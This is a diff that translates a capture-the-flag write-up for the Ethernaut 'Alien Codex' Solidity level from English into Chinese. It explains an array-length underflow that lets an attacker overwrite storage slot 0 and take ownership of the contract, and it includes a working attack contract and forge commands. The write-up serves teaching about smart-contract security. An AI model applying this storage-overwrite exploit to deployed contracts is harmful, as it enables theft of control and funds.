@@ -17,32 +17,26 @@
 - [漏洞](#漏洞)
 - [解答](#解答)
 - [要点](#要点)
+- [参考](#参考)
 
 ## 目标
 
+拿到合约的所有权
 <img src="../imgs/requirements/19-alien-requirements.webp" width="800px"/>
 
 ## 漏洞
 
-At this level, we have to find a way to override the `AlienCodex` contract's owner. We can see that it inherits from OpenZeppelin's Ownable.
+如何拿到 `AlienCodex` 的所有权呢？ 我们可以看到他是继承于`OpenZeppelin Ownable`,这个 `owner` 的存储是在 `Ownable` 中定义的，它会和 contact 一起放在 storage 的 slot 0 处，我们就是改变这个位置的值.
 
-```javascript
-import '../helpers/Ownable-05.sol';
-
-contract AlienCodex is Ownable {`
-```
-
-So let's visualize the contract's storage layout:
+我们看一下存储结构:
 
 | Slot Index | var name | Var Type  | Var Size                              |
 | ---------- | -------- | --------- | ------------------------------------- |
 | 0          | owner    | address   | 20 bytes                              |
 | 0          | contact  | boolean   | 1 byte                                |
-| 1          | codex    | bytes32[] | 32 bytes for array's length, then ??? |
+| 1          | codex    | bytes32[] | 32 bytes  字节长度 |
 
-Now, let's browse through the rest of the contract's code.
-
-We see the following modifier used in all functions available to us except the `makeContact()` function:
+现在我们接着看剩下的代码。所有的函数，都需要通过`contacted`，当contact为True 时才执行后续动作;`makeContact()` 函数可以将contact变成True，而且任何人都可以调用，所以我们首先调用`makeContact()`，解除限制。
 
 ```javascript
  modifier contacted() {
@@ -51,90 +45,78 @@ We see the following modifier used in all functions available to us except the `
   }
 ```
 
-Fortunately, the `makeContact()` function is public and has no access restriction, so we can easily pass this modifier. It means that the challenge's solution lies in one of the following functions: `record()`, `retract()`, or `revise()`. All those three functions are related to the `codex` array, either adding, removing, or updating its content.
+合约剩下的函数，`record()`, `retract()`, `revise()`，都与数组`codex`相关，可以添加、删除或更新内容。还有一个关键点，Solidity 版本是pragma solidity ^0.5.0，小于0.8.0 意味着可能有overflow/underflow 漏洞，我们正好利用这点。
 
-Now, it is time to take another look at the contract. It turns out it is using `solidity ^0.5.0`, meaning that there are no overflow/underflow checks natively integrated into solidity yet. So how could we take advantage of this?
+### 1. 数组溢出
 
-### 1. Codex array underflow
-
-- the `record()` function allows us to push a new `bytes32` into the `codex` array. Nothing interesting here.
-- the `revise()` function allows us to update an existing value in the `codex` array. Let's keep that in mind since we will most likely be looking at overriding the `owner` variable at some point.
-- the `retract()` function allows us to remove the last `bytes32` from the `codex` array. However, it is not using `array.pop()` but rather `array.length--`, which is reducing the array size by one. And we know that there is no underflow check.
-
-So what would happen if we call this function on an empty array? The array's length would underflow and would become equal to `2**256 - 1`. This is interesting because `2**256 - 1` is the maximum storage capacity for a contract. So thanks to the dynamic `codex` array, we can now access <b>ANY</b> slot in the Alien Codex contract's storage!
-
-### 2. Owner override
-
-Now that we have access to the whole contract's storage, we have to find the right index so we can call the `revise()` function and update its value.
-
-The slot 1 is storing the length of the `codex` array. Then, the elements are stored starting at the slot equal to the hash of the slot index storing the array's length.
-
-```java
-bytes32 hash = keccak256(abi.encode(1));
-codex[0] = hash;
-codex[1] = hash + 1;
-codex[2] = hash + 2;
-...
+```javascript
+    function retract() public contacted {
+        codex.length--;
+    }
 ```
 
-Now, let's calculate the index of the `owner` variable. We know that the `owner` variable is stored at the first slot of the contract's storage. So we can calculate the index of the `owner` variable by using the following formula:
+`retract()`的逻辑`array.length--`，可能会导致溢出。如果当前长度为0，对当前长度为0 的codex减去1，它的长度会因0 - 1 发生下溢变成一个极大值2²⁵⁶ - 1 (0xfff…fff)，也就是codex长度变成和合约storage slot 总数相同(2²⁵⁶ -1)。
 
-`hash + index = slot 0` so `index = slot 0 - hash`
+再来是最关键的部分！有了这么长的codex，其index 将能涵盖合约整个storage slot 的数量，也代表调用`revise()`可以指定任意的storage slot 作为参数index ，并将任一数值写入指定的storage slot，这正是我们改写slot 0数值的唯一方法。
 
-```java
-uint256 index = 0 - uint256(keccak256(abi.encode(1)));
-```
+### 2. 修改slot0
 
-All that is left to do is to call the `revise()` function with the calculated index to take ownership of the contract...
+问题是要给予什么index 才能改写位于slot 0 的数值。来点简单的数学，已知storage layout 如下：
+
+|Slot         |  Data                         |
+|-------------|-----------------              |
+|   0         |  owner address , contact bool |
+|   1         |  codex .length                |
+|   ... ...   |                               |
+|   p         |  codex [0]                    |
+| p + 1       |  codex [1]                    |
+|   ... ...   |                               |
+|2 ^ 256 - 2  |    codex [2^256 - 2 - p]      |
+|2 ^ 256 - 1  |    codex [2^256 - 1 - p]      |
+|   0         |  codex [2 ^256 - p]           |
+
+假设codex[0] 位于 slot p，则上表最下方的codex[2²⁵⁶ — p] 将因overflow 而位于slot 0，它(2²⁵⁶ — p) 就是我们要计算出的index。codex[0] 会储存在keccak256(codex.length 所在slot)，故 p 值等于keccak256(1)，将p 值带入codex[2²⁵⁶ — p] 后可得：index = 2^256 - keccak256(1)，index 答案就出来啦！有了正确的index，再把msg.sender 的地址写入即可取得合约所有权。
 
 ## 解答
 
-Here is how the complete solution looks like:
+实现攻击合约:
 
 ```javascript
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-interface IAlienCodex {
-    function owner() external returns (address);
-    function makeContact() external;
-    function retract() external;
-    function revise(uint256 i, bytes32 _content) external;
-}
+contract Attack {
+    AlienCodex instance;
 
-contract AlienDecodex {
-    IAlienCodex private immutable alienCodex;
+    constructor(address fb) {
+        instance = AlienCodex(fb);
+    }
 
-    constructor(address _alienCodex) {
-        alienCodex = IAlienCodex(_alienCodex);
-        alienCodex.makeContact();
-        alienCodex.retract();
-        bytes32 hash = keccak256(abi.encode(1));
-        uint256 i;
+    function attack() public {
+        instance.makeContact();
+        instance.retract();
 
-        unchecked { // volountary underflow
-            i -= uint256(hash);
+        unchecked {
+            uint index = uint256(2) ** uint256(256) -
+                uint256(keccak256(abi.encode(uint256(1))));
+            instance.revise(index, bytes32(uint256(uint160(msg.sender))));
         }
-
-        alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));
-        require(alienCodex.owner() == msg.sender, "Hack failed");
     }
 }
 
 ```
 
-Then run the script with the following command:
+你可以在项目的根目录执行以下命令，进行验证：
 
 ```bash
-forge script script/19_AlienCodex.s.sol:PoC --rpc-url sepolia --broadcast --watch
+forge test --match-contract  AlienCodexTest  -vvvvv
 ```
 
 ## 要点
 
-- Underflow and overflow are not limited to the token's balances!
-- Using `.length--` on an empty array causes an underflow and sets its length to 2\*\*256-1.
+- 注意溢出，不过现在0.8.0有自动溢位检查!
 
-## Reference
+## 参考
 
 - Array Members: https://docs.soliditylang.org/en/latest/types.html#array-members
 
